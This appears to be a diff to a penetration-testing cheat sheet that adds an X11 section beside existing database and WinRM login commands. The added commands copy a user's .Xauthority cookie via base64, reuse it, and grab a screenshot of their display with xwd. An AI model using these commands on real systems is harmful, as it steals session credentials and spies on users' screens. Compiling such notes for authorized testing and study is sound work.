@@ -173,6 +173,17 @@ $ psql -h <IP address> -U <username> -p <password>
 $ evil-winrm -i <IP address> -u <username> -p <password>
 ```
 
+- X11 (port 6000)
+
+```
+$ cat .Xauthority | base64
+$ echo AQAADHN<...SNIP...>S0xAoNm/oZZ4/ | base64 -d > /tmp/.Xauthority
+$ export XAUTHORITY=/tmp/.Xauthority
+$ w
+$ xwd -root -screen -silent -display :0 > /tmp/screen.xwd
+$ convert screen.xwd screen.png
+```
+
 - Redis (port 6379)
 
 ```
